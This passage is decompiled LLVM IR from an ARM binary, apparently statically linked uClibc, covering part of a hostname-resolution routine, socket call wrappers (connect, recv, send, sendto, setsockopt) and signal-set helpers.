  br i1 %tmp32, label %dec_label_pc_14a78, label %dec_label_pc_14804

dec_label_pc_14804:                               ; preds = %dec_label_pc_147f8
  %v1_14804 = add i32 %v0_147f8, -12
  store i32 %v1_14804, i32* %r3.global-to-local, align 4
  %v0_14808 = load i32, i32* @r7, align 4
  %v1_14808 = add i32 %v0_14808, 4
  store i32 %v1_14808, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_14814 = inttoptr i32 %v1_14808 to i32*
  store i32 %v0_14808, i32* %v3_14814, align 4
  %v0_14818 = load i32, i32* @r5, align 4
  %v1_14818 = load i32, i32* @sb, align 4
  %v2_14818 = add i32 %v1_14818, 4
  %v3_14818 = inttoptr i32 %v2_14818 to i32*
  store i32 %v0_14818, i32* %v3_14818, align 4
  %tmp33 = icmp ult i32 %v1_14804, 32
  br i1 %tmp33, label %dec_label_pc_14a78, label %dec_label_pc_14820

dec_label_pc_14820:                               ; preds = %dec_label_pc_14804
  %v0_14820 = load i32, i32* @r4, align 4
  %v1_14820 = add i32 %v0_14820, -44
  store i32 %v1_14820, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_14820, 256
  br i1 %tmp34, label %dec_label_pc_14a78, label %dec_label_pc_1482c

dec_label_pc_1482c:                               ; preds = %dec_label_pc_14820
  %v0_1482c = load i32, i32* @r7, align 4
  %v1_1482c = add i32 %v0_1482c, 44
  store i32 %v1_1482c, i32* @r6, align 4
  %v1_14830 = add i32 %v0_1482c, 12
  store i32 %v1_14830, i32* %r3.global-to-local, align 4
  %v0_14834 = load i32, i32* @fp, align 4
  store i32 %v0_14834, i32* @r1, align 4
  store i32 %v1_14820, i32* %r2.global-to-local, align 4
  store i32 %v1_1482c, i32* %r0.global-to-local, align 4
  %v3_14844 = call i32 @strncpy(i32 %v1_1482c, i32 %v0_14834, i32 %v1_14820)
  store i32 %v1_14830, i32* %ip.global-to-local, align 4
  %v0_1484c = load i32, i32* @r6, align 4
  %v1_1484c = load i32, i32* @r7, align 4
  %v2_1484c = add i32 %v1_1484c, 12
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  store i32 %v0_1484c, i32* %v3_1484c, align 4
  %v0_14850 = load i32, i32* @fp, align 4
  store i32 %v0_14850, i32* %r0.global-to-local, align 4
  %v0_14854 = load i32, i32* @r5, align 4
  %v1_14854 = load i32, i32* %ip.global-to-local, align 4
  %v2_14854 = add i32 %v1_14854, 4
  %v3_14854 = inttoptr i32 %v2_14854 to i32*
  store i32 %v0_14854, i32* %v3_14854, align 4
  %v0_14858 = load i32, i32* @r7, align 4
  %v2_1485c = inttoptr i32 %v0_14850 to i8*
  %v3_1485c = call i32 @inet_aton(i8* %v2_1485c, i32 %v0_14858)
  store i32 %v3_1485c, i32* %r0.global-to-local, align 4
  %v2_14860 = icmp eq i32 %v3_1485c, 0
  br i1 %v2_14860, label %dec_label_pc_148a4, label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_1482c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_14870 = load i32, i32* @sl, align 4
  %v2_14870 = add i32 %v1_14870, 8
  %v3_14870 = inttoptr i32 %v2_14870 to i32*
  store i32 2, i32* %v3_14870, align 4
  %v0_14874 = load i32, i32* %r3.global-to-local, align 4
  %v2_14874 = mul i32 %v0_14874, 2
  %v1_14878 = load i32, i32* @sl, align 4
  %v2_14878 = add i32 %v1_14878, 12
  %v3_14878 = inttoptr i32 %v2_14878 to i32*
  store i32 %v2_14874, i32* %v3_14878, align 4
  %v3_1487c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1487c, i32* %r2.global-to-local, align 4
  store i32 %v1_14830, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_14888 = load i32, i32* @r5, align 4
  store i32 %v0_14888, i32* %r0.global-to-local, align 4
  %v0_1488c = load i32, i32* @sl, align 4
  %v2_1488c = inttoptr i32 %v3_1487c to i32*
  store i32 %v0_1488c, i32* %v2_1488c, align 4
  %v0_14890 = load i32, i32* @r6, align 4
  %v1_14890 = load i32, i32* @sl, align 4
  %v2_14890 = inttoptr i32 %v1_14890 to i32*
  store i32 %v0_14890, i32* %v2_14890, align 4
  %v0_14894 = load i32, i32* @sb, align 4
  %v1_14894 = load i32, i32* @sl, align 4
  %v2_14894 = add i32 %v1_14894, 16
  %v3_14894 = inttoptr i32 %v2_14894 to i32*
  store i32 %v0_14894, i32* %v3_14894, align 4
  %v0_14898 = load i32, i32* %r3.global-to-local, align 4
  %v1_14898 = load i32, i32* @sl, align 4
  %v2_14898 = add i32 %v1_14898, 4
  %v3_14898 = inttoptr i32 %v2_14898 to i32*
  store i32 %v0_14898, i32* %v3_14898, align 4
  %v0_1489c = load i32, i32* @r5, align 4
  %v1_1489c = load i32, i32* %ip.global-to-local, align 4
  %v2_1489c = inttoptr i32 %v1_1489c to i32*
  store i32 %v0_1489c, i32* %v2_1489c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_148a4:                               ; preds = %dec_label_pc_1482c
  %v2_148a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_148a4, i32* @r5, align 4
  %v1_148a8 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2c8d0.1128 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_148a4, i32* @r0, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  %v1_148c0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c8d0.1128 to i32), i32* %r0.global-to-local, align 4
  %v1_148d0 = call i32 @__pthread_return_0()
  store i32 %v2_148a4, i32* @r0, align 4
  %v2_148dc = load i32, i32* @global_var_32c48.1133, align 4
  store i32 %v2_148dc, i32* @r4, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  %v1_148ec = call i32 @__pthread_return_void()
  %v2_148f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_32c3c.1136 to i32), i32* %r3.global-to-local, align 4
  %v0_14904 = load i32, i32* @fp, align 4
  store i32 %v0_14904, i32* %r0.global-to-local, align 4
  %v2_14908 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_14908, i32* %ip.global-to-local, align 4
  %v0_1490c = load i32, i32* @r4, align 4
  store i32 %v0_1490c, i32* %r2.global-to-local, align 4
  %v6_14920 = inttoptr i32 %v0_14904 to i8*
  %v7_14920 = call i32 @__dns_lookup(i8* %v6_14920, i32 1, i32 %v0_1490c, i32 ptrtoint (i32* @global_var_32c3c.1136 to i32), i32 %v2_148f8, i32 %v2_14908)
  store i32 %v7_14920, i32* %r0.global-to-local, align 4
  %v1_14924 = icmp slt i32 %v7_14920, 0
  br i1 %v1_14924, label %.dec_label_pc_14a50_crit_edge, label %dec_label_pc_14934

.dec_label_pc_14a50_crit_edge:                    ; preds = %dec_label_pc_148a4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a50

dec_label_pc_14934:                               ; preds = %dec_label_pc_148a4
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_14948 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_14948, 255
  br i1 %tmp35, label %dec_label_pc_149e4, label %dec_label_pc_14950

dec_label_pc_14950:                               ; preds = %dec_label_pc_14934
  %v3_14950 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_14950, i32* @r0, align 4
  %v0_14954 = call i32 @free()
  %v3_14958 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14958, i32* @r0, align 4
  %v0_1495c = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_1479c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_149e4:                               ; preds = %dec_label_pc_14934
  %v3_149e8.pre = load i32, i32* %stack_var_-96, align 4
  %v0_149ec.pre = load i32, i32* @r6, align 4
  store i32 %v1_14948, i32* %r2.global-to-local, align 4
  store i32 %v3_149e8.pre, i32* @r1, align 4
  store i32 %v0_149ec.pre, i32* %r0.global-to-local, align 4
  %v3_149f0 = call i32 @strncpy(i32 %v0_149ec.pre, i32 %v3_149e8.pre, i32 %v1_14948)
  %v3_149f4 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_149f4, i32* @r0, align 4
  %v0_149f8 = call i32 @free()
  store i32 %v0_149f8, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_14a00 = icmp eq i32 %tmp7, 1
  br i1 %v7_14a00, label %dec_label_pc_14a08, label %dec_label_pc_14a5c

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149e4
  store i32 4, i32* @r2, align 4
  %v0_14a10 = load i32, i32* @r7, align 4
  store i32 %v0_14a10, i32* @r0, align 4
  %v0_14a14 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_14830, i32* %r2.global-to-local, align 4
  %v1_14a20 = load i32, i32* @sl, align 4
  %v2_14a20 = add i32 %v1_14a20, 8
  %v3_14a20 = inttoptr i32 %v2_14a20 to i32*
  store i32 2, i32* %v3_14a20, align 4
  %v0_14a24 = load i32, i32* %r3.global-to-local, align 4
  %v2_14a24 = mul i32 %v0_14a24, 2
  store i32 %v2_14a24, i32* %r3.global-to-local, align 4
  %v1_14a28 = load i32, i32* @sl, align 4
  %v2_14a28 = add i32 %v1_14a28, 12
  %v3_14a28 = inttoptr i32 %v2_14a28 to i32*
  store i32 %v2_14a24, i32* %v3_14a28, align 4
  %v3_14a2c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14a2c, i32* @r0, align 4
  %v0_14a30 = load i32, i32* @r6, align 4
  %v1_14a30 = load i32, i32* @sl, align 4
  %v2_14a30 = inttoptr i32 %v1_14a30 to i32*
  store i32 %v0_14a30, i32* %v2_14a30, align 4
  %v0_14a34 = load i32, i32* @sb, align 4
  %v1_14a34 = load i32, i32* @sl, align 4
  %v2_14a34 = add i32 %v1_14a34, 16
  %v3_14a34 = inttoptr i32 %v2_14a34 to i32*
  store i32 %v0_14a34, i32* %v3_14a34, align 4
  %v0_14a38 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a38 = load i32, i32* @sl, align 4
  %v2_14a38 = add i32 %v1_14a38, 4
  %v3_14a38 = inttoptr i32 %v2_14a38 to i32*
  store i32 %v0_14a38, i32* %v3_14a38, align 4
  %v0_14a3c = call i32 @free()
  %v3_14a40 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14a40, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14a48 = load i32, i32* @sl, align 4
  %v2_14a48 = inttoptr i32 %v3_14a40 to i32*
  store i32 %v0_14a48, i32* %v2_14a48, align 4
  %v0_14a4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14a4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a50

dec_label_pc_14a50:                               ; preds = %.dec_label_pc_14a50_crit_edge, %dec_label_pc_14a08
  %v0_14a54 = phi i32 [ 1, %.dec_label_pc_14a50_crit_edge ], [ %v0_14a4c, %dec_label_pc_14a08 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_14a54, i32* %v1_1479c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_149e4
  %v3_14a5c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14a5c, i32* @r0, align 4
  %v0_14a60 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_1479c, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a78:                               ; preds = %dec_label_pc_147d4, %dec_label_pc_14820, %dec_label_pc_14804, %dec_label_pc_147f8, %dec_label_pc_147e4
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %bb, %dec_label_pc_147b8, %dec_label_pc_147b0, %dec_label_pc_14758, %dec_label_pc_14a5c, %dec_label_pc_14a50, %dec_label_pc_14950, %dec_label_pc_1486c, %dec_label_pc_14a78
  store i32 %v6_1472c, i32* @r5, align 4
  store i32 %v9_1472c, i32* @r6, align 4
  store i32 %v12_1472c, i32* @r7, align 4
  store i32 %v15_1472c, i32* @r8, align 4
  store i32 %v18_1472c, i32* @sb, align 4
  store i32 %v21_1472c, i32* @sl, align 4
  store i32 %v24_1472c, i32* @fp, align 4
  %v29_14a80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_14a80

; uselistorder directives
  uselistorder i32 %v2_14a24, { 1, 0 }
  uselistorder i32 %v1_14948, { 1, 2, 0 }
  uselistorder i32 %v1_14830, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1482c, { 1, 0, 2 }
  uselistorder i32 %v1_14820, { 2, 1, 0, 3 }
  uselistorder i32 %v0_147ec.pre, { 0, 2, 1 }
  uselistorder i32 %v1_147c8, { 1, 0 }
  uselistorder i32* %v1_1479c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_1473c, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14a7c, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_14a78, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14a50, { 1, 0 }
  uselistorder label %dec_label_pc_147e4, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14aa0 = load i32, i32* @r4, align 4
  store i32 %v3_14aa0, i32* %stack_var_-8, align 4
  %v5_14aa4 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_14aa4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14aa4, -4095
  br i1 %tmp, label %dec_label_pc_14ac4, label %dec_label_pc_14ab4

dec_label_pc_14ab4:                               ; preds = %entry
  %v0_14ab4 = call i32 @__errno_location()
  %v0_14ab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ab8 = sub i32 0, %v0_14ab8
  %v2_14abc = inttoptr i32 %v0_14ab4 to i32*
  store i32 %v1_14ab8, i32* %v2_14abc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14ac4

dec_label_pc_14ac4:                               ; preds = %entry, %dec_label_pc_14ab4
  %v0_14ac4 = phi i32 [ %v5_14aa4, %entry ], [ -1, %dec_label_pc_14ab4 ]
  %v2_14ac8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ac8, i32* @r4, align 4
  ret i32 %v0_14ac4

; uselistorder directives
  uselistorder i32 %v5_14aa4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ac4, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14acc = load i32, i32* @r4, align 4
  store i32 %v3_14acc, i32* %stack_var_-8, align 4
  %v5_14ad0 = inttoptr i32 %arg3 to i32*
  %v6_14ad0 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_14ad0)
  store i32 %v6_14ad0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_14ad0, -4095
  br i1 %tmp, label %dec_label_pc_14af0, label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %entry
  %v0_14ae0 = call i32 @__errno_location()
  %v0_14ae4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ae4 = sub i32 0, %v0_14ae4
  %v2_14ae8 = inttoptr i32 %v0_14ae0 to i32*
  store i32 %v1_14ae4, i32* %v2_14ae8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %entry, %dec_label_pc_14ae0
  %v0_14af0 = phi i32 [ %v6_14ad0, %entry ], [ -1, %dec_label_pc_14ae0 ]
  %v2_14af4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14af4, i32* @r4, align 4
  ret i32 %v0_14af0

; uselistorder directives
  uselistorder i32 %v6_14ad0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14af0, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14af8 = load i32, i32* @r4, align 4
  store i32 %v3_14af8, i32* %stack_var_-8, align 4
  %v0_14b00 = call i32 @getsockopt()
  store i32 %v0_14b00, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b00, -4095
  br i1 %tmp, label %dec_label_pc_14b20, label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %entry
  %v0_14b10 = call i32 @__errno_location()
  %v0_14b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b14 = sub i32 0, %v0_14b14
  %v2_14b18 = inttoptr i32 %v0_14b10 to i32*
  store i32 %v1_14b14, i32* %v2_14b18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b20

dec_label_pc_14b20:                               ; preds = %entry, %dec_label_pc_14b10
  %v0_14b20 = phi i32 [ %v0_14b00, %entry ], [ -1, %dec_label_pc_14b10 ]
  %v2_14b24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b24, i32* @r4, align 4
  ret i32 %v0_14b20

; uselistorder directives
  uselistorder i32 %v0_14b00, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14b20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b28 = load i32, i32* @r4, align 4
  store i32 %v3_14b28, i32* %stack_var_-8, align 4
  %v5_14b2c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_14b2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b2c, -4095
  br i1 %tmp, label %dec_label_pc_14b4c, label %dec_label_pc_14b3c

dec_label_pc_14b3c:                               ; preds = %entry
  %v0_14b3c = call i32 @__errno_location()
  %v0_14b40 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b40 = sub i32 0, %v0_14b40
  %v2_14b44 = inttoptr i32 %v0_14b3c to i32*
  store i32 %v1_14b40, i32* %v2_14b44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b4c

dec_label_pc_14b4c:                               ; preds = %entry, %dec_label_pc_14b3c
  %v0_14b4c = phi i32 [ %v5_14b2c, %entry ], [ -1, %dec_label_pc_14b3c ]
  %v2_14b50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b50, i32* @r4, align 4
  ret i32 %v0_14b4c

; uselistorder directives
  uselistorder i32 %v5_14b2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b4c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14b54 = load i32, i32* @r4, align 4
  store i32 %v3_14b54, i32* %stack_var_-8, align 4
  %v5_14b58 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_14b58, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b58, -4095
  br i1 %tmp, label %dec_label_pc_14b78, label %dec_label_pc_14b68

dec_label_pc_14b68:                               ; preds = %entry
  %v0_14b68 = call i32 @__errno_location()
  %v0_14b6c = load i32, i32* %r4.global-to-local, align 4
  %v1_14b6c = sub i32 0, %v0_14b6c
  %v2_14b70 = inttoptr i32 %v0_14b68 to i32*
  store i32 %v1_14b6c, i32* %v2_14b70, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b78

dec_label_pc_14b78:                               ; preds = %entry, %dec_label_pc_14b68
  %v0_14b78 = phi i32 [ %v5_14b58, %entry ], [ -1, %dec_label_pc_14b68 ]
  %v2_14b7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b7c, i32* @r4, align 4
  ret i32 %v0_14b78

; uselistorder directives
  uselistorder i32 %v5_14b58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b78, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14b80 = load i32, i32* @r4, align 4
  store i32 %v3_14b80, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_14b8c = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_14b8c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14b8c, -4095
  br i1 %tmp, label %dec_label_pc_14bac, label %dec_label_pc_14b9c

dec_label_pc_14b9c:                               ; preds = %entry
  %v0_14b9c = call i32 @__errno_location()
  %v0_14ba0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ba0 = sub i32 0, %v0_14ba0
  %v2_14ba4 = inttoptr i32 %v0_14b9c to i32*
  store i32 %v1_14ba0, i32* %v2_14ba4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %entry, %dec_label_pc_14b9c
  %v0_14bac = phi i32 [ %v5_14b8c, %entry ], [ -1, %dec_label_pc_14b9c ]
  %v2_14bb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14bb0, i32* @r4, align 4
  ret i32 %v0_14bac

; uselistorder directives
  uselistorder i32 %v5_14b8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bac, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bb4 = load i32, i32* @r4, align 4
  store i32 %v3_14bb4, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_14bbc = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_14bbc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14bbc, -4095
  br i1 %tmp, label %dec_label_pc_14bdc, label %dec_label_pc_14bcc

dec_label_pc_14bcc:                               ; preds = %entry
  %v0_14bcc = call i32 @__errno_location()
  %v0_14bd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bd0 = sub i32 0, %v0_14bd0
  %v2_14bd4 = inttoptr i32 %v0_14bcc to i32*
  store i32 %v1_14bd0, i32* %v2_14bd4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14bdc

dec_label_pc_14bdc:                               ; preds = %entry, %dec_label_pc_14bcc
  %v0_14bdc = phi i32 [ %v5_14bbc, %entry ], [ -1, %dec_label_pc_14bcc ]
  %v2_14be0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14be0, i32* @r4, align 4
  ret i32 %v0_14bdc

; uselistorder directives
  uselistorder i32 %v5_14bbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bdc, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14be4 = load i32, i32* @r4, align 4
  store i32 %v3_14be4, i32* %stack_var_-8, align 4
  %v0_14be8 = call i32 @socket()
  store i32 %v0_14be8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14be8, -4095
  br i1 %tmp, label %dec_label_pc_14c08, label %dec_label_pc_14bf8

dec_label_pc_14bf8:                               ; preds = %entry
  %v0_14bf8 = call i32 @__errno_location()
  %v0_14bfc = load i32, i32* %r4.global-to-local, align 4
  %v1_14bfc = sub i32 0, %v0_14bfc
  %v2_14c00 = inttoptr i32 %v0_14bf8 to i32*
  store i32 %v1_14bfc, i32* %v2_14c00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %entry, %dec_label_pc_14bf8
  %v0_14c08 = phi i32 [ %v0_14be8, %entry ], [ -1, %dec_label_pc_14bf8 ]
  %v2_14c0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c0c, i32* @r4, align 4
  ret i32 %v0_14c08

; uselistorder directives
  uselistorder i32 %v0_14be8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c08, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_14c2c, label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %entry
  %v8_14c20 = icmp sgt i32 %arg1, 64
  br i1 %v8_14c20, label %dec_label_pc_14c2c, label %dec_label_pc_14c24

dec_label_pc_14c24:                               ; preds = %dec_label_pc_14c1c
  %v0_14c28 = call i32 @__sigaddset()
  br label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c1c, %entry, %dec_label_pc_14c24
  %v0_14c2c = call i32 @__errno_location()
  %v2_14c34 = inttoptr i32 %v0_14c2c to i32*
  store i32 22, i32* %v2_14c34, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c2c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_14c4c = load i32, i32* @r0, align 4
  %v2_14c4c = inttoptr i32 %v0_14c4c to i8*
  %v3_14c4c = call i32 @__GI_memset(i8* %v2_14c4c, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c58 = load i32, i32* @r4, align 4
  store i32 %v3_14c58, i32* %stack_var_-12, align 4
  %v6_14c58 = load i32, i32* @r5, align 4
  %v10_14c58 = ptrtoint i32* %stack_var_-12 to i32
  %v7_14c5c = icmp eq i32 %arg2, -1
  %v0_14c68.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_14c5c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_14c80

bb:                                               ; preds = %entry
  %v2_14c64 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_14c68.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_14c68.pre, 1
  br i1 %tmp19, label %dec_label_pc_14c80, label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %bb
  %v7_14c74 = icmp sgt i32 %v0_14c68.pre, 64
  br i1 %v7_14c74, label %dec_label_pc_14c80, label %bb20

bb20:                                             ; preds = %dec_label_pc_14c70
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_14ca424 = add i32 %v10_14c58, 124
  br label %dec_label_pc_14c94

dec_label_pc_14c80:                               ; preds = %.thread, %dec_label_pc_14c70, %bb
  %v0_14c80 = call i32 @__errno_location()
  store i32 %v0_14c80, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r2, align 4
  %v2_14c8c = inttoptr i32 %v0_14c80 to i32*
  store i32 22, i32* %v2_14c8c, align 4
  %v0_14d00.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14d00

dec_label_pc_14c94:                               ; preds = %bb20, %dec_label_pc_14c94
  %v5_14ca425 = phi i32 [ %v5_14ca424, %bb20 ], [ %v5_14ca4, %dec_label_pc_14c94 ]
